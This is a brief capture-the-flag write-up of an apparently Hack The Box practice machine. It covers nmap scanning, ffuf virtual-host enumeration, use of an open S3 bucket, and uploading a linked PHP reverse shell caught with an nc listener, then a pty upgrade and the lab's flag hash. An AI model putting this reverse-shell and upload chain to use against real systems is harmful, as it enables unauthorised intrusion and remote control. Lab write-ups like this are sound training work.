
`sudo nmap -vvv -Pn -sC -sCV --reason -T4 -p0-65535 10.129.11.195 `

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCitBp4qe2+WEqMGa7+L3eEgbrqD/tH3G5PYsQ9nMFx6Erg9Rp+jn7D9QqC9GqKdraCCUQTzVoW3zqEd83Ef4iWR7VXjTb469txJU+Y8XlG/4JzegbjO6WYyfQTtQ3nLkqpa21BZEdH9ap28mcJAggj4/uHTiA3yTgZ2C+zPA6LoIS7CaB1DPK2q/8wrxDiRNv4gGiSjcxEilpL8Qls4R3Ny3QJD89hvgEdV9zapTS5T9hOfUdwbkElabjrWL4zs/E+cyHSZF5pPREiv6QkdMmk7cvMND5epXA29womDuabJsDLhrFYFecJxDmXhv6yspRAemCewOX+GnWckerKYeOf
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEkEPksFeIH9z6Ds6r7s2Uff45kDk/PEnvXYwP0ny6pKsP2s62W3PZVCywfF3aC8ONsAqQh6zy0s44Zv8B8g+rI=
|   256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINwGMkF/JG8KPrh19vLPmhe+RC0WBQt06gh1zE3EOo2q
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Toppers
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


`ffuf -u "http://thetoppers.htb" -H "Host: FUZZ.thetoppers.htb" -w /usr/share/seclists/SecLsts-master/Discovery/DNS/subdomains-top1million-5000.txt`


Since we do not have a dns server we have to enumerate subdomains using vhosts. These are esseantially headers that allow webservers to host multiple pages like example.fm.com and test.fm.com. The request you make includes a header like `HOST: test.fm.com` this command will enumerate that host header


```
vo                      [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 64ms]
sonia                   [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 53ms]
betty                   [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 64ms]
www.msk                 [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 64ms]
schools                 [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 69ms]
igor                    [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 169ms]
polar                   [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 166ms]
brs                     [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 167ms]
epm                     [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 126ms]
phpadmin                [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 139ms]
nicolas                 [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 26ms]
smartphone              [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 30ms]
lamour                  [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 724ms]
laguna                  [Status: 200, Size: 11952, Words: 1832, Lines: 235, Duration: 28ms]

```


This command is spitting out unusable garbage - This is because the vhosts that host nothing are redirecting us to the main page thetoppers.htb to fix this we will add a filter parameter to filter out all sites with the size of 11952, which we know is the main page `-fs 11952` filter size, we also need to account for status codes that are not 200-299, so we add the option -mc all

`ffuf -u "http://thetoppers.htb" -H "Host: FUZZ.thetoppers.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 11952 -mc all`

after enumerating this we find an open s3 bucket which we can use the aws cli to interact with 

good php [shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

we modify this shell and spawn our rlwrapped nc listner rlwrap nc -nvlp 8080 

SHELL!

`this is a very easy box so no priv esc`

python one liner  python3 -c 'import pty; pty.spawn("/bin/bash")' `cuz why not`


we navigate to the default directory for a web page and get our flag 

```
www-data@three:/var/www$ cat flag.txt
cat flag.txt
a980d99281a28d638ac68b9bf9453c2b
```


We learned how to use the AWS cli to enumerate and interact with an s3 bucket. We also used ffuf to enumerate subdomains via VHOST. 